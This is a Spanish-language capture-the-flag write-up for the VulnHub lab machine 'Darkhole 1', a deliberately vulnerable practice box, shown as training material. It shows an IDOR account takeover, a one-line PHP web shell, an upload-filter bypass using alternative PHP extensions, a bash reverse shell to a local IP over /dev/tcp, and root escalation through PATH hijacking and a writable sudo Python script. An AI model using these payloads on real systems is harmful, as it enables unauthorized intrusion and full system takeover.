---
layout: single
title: Darkhole 1 - VulnHub
excerpt: " Difficulty: Easy
It's a box for beginners, but not easy, Good Luck
Hint: Don't waste your time For Brute-Force "
date: 2023-01-25
classes: wide
header:
  teaser: /blog/assets/images/vh-writeup-darkhole1/darkhole.png
  teaser_home_page: true
  icon: /blog/assets/images/vulnhub.webp
categories:
  - vulnhub
tags:
  - burpsuite
  - php
  - rce
  - python
  - hijacking
---

Difficulty: Easy
It's a box for beginners, but not easy, Good Luck
Hint: Don't waste your time For Brute-Force

# Summary
- IP: 192.168.0.109
- Ports: 22,80
- OS: Linux (Ubuntu Focal)
- Services & Applications:
	-  22 -> OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
	-  80 -> Apache httpd 2.4.41

# Recon

- Escaneo básico de puertos:

```bash
$nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 192.168.0.109 -oG allPorts
```


- Escaneo profundo de puertos encontrados:

```bash
$nmap -p22,80 -sCV 192.168.0.109 -oN targeted
```



# Análisis de página web:

- Entramos a la web y encontramos un apartado de login, intentamos bypassear con SQLI pero no funciona.

- Nos registramos con datos aleatorios, y accedemos como el usuario que creamos.

- Vemos un apartado de "Cambiar contraseña", lo hacemos interceptando la petición con burpsuite para su posterior análisis.

- En la petición podemos ver la siguiente linea:

```
password=hola123&id=2
```

- Lo que quiere decir que el momento de cambiar la contraseña lo hace haciendo referencia al "id" del usuario al que se le asignará la nueva, intentamos manipular la petición apuntando al "id=1" suponiendo que el usuario con "id=1" es "admin":

password=hola123&id=1

- Ahora en el login intentamos acceder como "admin" con la nueva contraseña creada y efectivamente funciona.

- Vemos un apartado de subida de archivos, en el que intentamos subir un archivo de prueba para comprobar que podemos acceder a él; obtenemos el siguiente directorio:

```
http://192.168.0.109/upload/prueba.txt
```


# RCE (subida de archivo PHP malicioso):

- Con el "Wappalizer" podemos evidenciar que la página utiliza lenguaje de programación "PHP", por lo que intentamos subir un archivo PHP, pero nos dice que no es permitida la extensión .php, así que intentamos con todas las demás alternativas de .php con bupsuite.

-  Creamos el archivo php malicioso.

```php
<?php echo passthru($_GET["cmd"]); ?>
```

- Lo subimos e interceptamos la petición con Burpsuite.

- Mandamos la petición al "Intruder"

- Hacemos un ataque de tipo "Sniper", hacemos "clear" y seleccionamos la extensión ".php" y hacemos click en "add"

- En la pestaña "Payloads" en "payloads options" añadimos todas las extensiones posibles de php.

```
.php
.php3
.php4
.php5
.phtml
.phar
.phtm
```

- En la pestaña "options" en "Grep extract" hacemo "fetch response" y seleccionamos el mensaje de error que nos tira al intentar subir el archivo .php

- Iniciamos el ataque y vemos que sí se subieron algunas alternativas de php.

- Accedemos al archivo .phtml y comprobamos el RCE.

```
http://192.168.0.109/upload/cmd.phtml
```

- Entablamos una reverse shell básica y accedemos como "www-data".

```
http://192.168.0.109/upload/cmd.phtml?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.0.108/443 0>%261"
```

# ESCALANDO PRIVILEGIOS:

- Vemos un binario "toto" el cual tiene permisos SUID, lo ejecutamos y vemos que nos despliega lo que haría el comando "id"

- Intentamos hacer un PATH HIJACKING, creando un archivo "id":

```bash
touch /tmp/id
chmod +x /tmp/id
nano /tmp/id
```

```
/bin/bash
```

```bash
export PATH=/tmp:$PATH
```

- Ahora ejecutamos el binario "toto"

```bash
./toto
```

- Pivotamos al usuario "john", abrimos el archivo "password" y encontramos una credencial, vemos permisos de sudoers usando la contraseña encontrada y nos damos cuenta que podemos ejecutar lo siguiente como "root" sin contraseña:

 ```
 (root) /usr/bin/python3 /home/john/file.py
 ```

- Como tenemos permisos de escritura en dicho archivo, lo modificamos de manera que nos despliegue una bash, la cual se hará como root ya que se está ejecutando el archivo como root.

```bash
nano file.py
```

```python
import os
os.execl("/bin/sh", "sh", "-p")
```

- Obtenemos una bash como ROOT y podemos ver la flag.

También podíamos modificar el archivo de python insertando código de manera que se otorgue permisos SUID a la bash:

```python
import os
os.system("chmod u+s /bin/bash")
```
